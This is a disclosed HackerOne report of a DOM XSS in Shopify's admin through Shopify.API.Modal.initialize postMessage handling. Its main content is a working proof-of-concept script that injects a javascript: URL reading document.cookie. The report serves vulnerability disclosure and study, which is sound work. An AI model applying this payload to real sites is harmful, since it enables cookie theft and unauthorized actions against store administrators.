---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '602767'
original_report_id: '602767'
title: DOM XSS via Shopify.API.Modal.initialize
weakness: Cross-site Scripting (XSS) - DOM
team_handle: shopify
created_at: '2019-06-07T01:10:31.500Z'
disclosed_at: '2019-06-21T18:28:11.960Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 34
asset_identifier: your-store.myshopify.com
asset_type: URL
max_severity: critical
tags:
- hackerone
- cross-site-scripting-xss-dom
---

# DOM XSS via Shopify.API.Modal.initialize

## Metadata

- HackerOne Report ID: 602767
- Weakness: Cross-site Scripting (XSS) - DOM
- Program: shopify
- Disclosed At: 2019-06-21T18:28:11.960Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

Similar #422043 & #576532

Payload ( Based on #576532): 

```html
<script>
    function attack(){
        const ctx = window.open(location.origin+'/admin/themes', '_blank')
        const json = {
            message: "Shopify.API.Modal.initialize",
            data: {
                src: ""
            }
        }

        let interval;
        interval = setInterval(function(){
            if (window.attackSuccess) {
                clearInterval(interval)
            } else {
                ctx.postMessage(JSON.stringify(json)) // data.src == ""
                json.data.src = "javascript:alert(document.cookie)"
                ctx.postMessage(JSON.stringify(json))
            }
        }, 500)
    }
    attack()
</script>
<a href="javascript:attack()" style="display:block;text-align:center;width:100%;height:300px;line-height:300px;background:#000;color:#fff;">click me start attack</a>
```

## Impact

Perform unauthorized actions on a store admin on any embedded apps.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
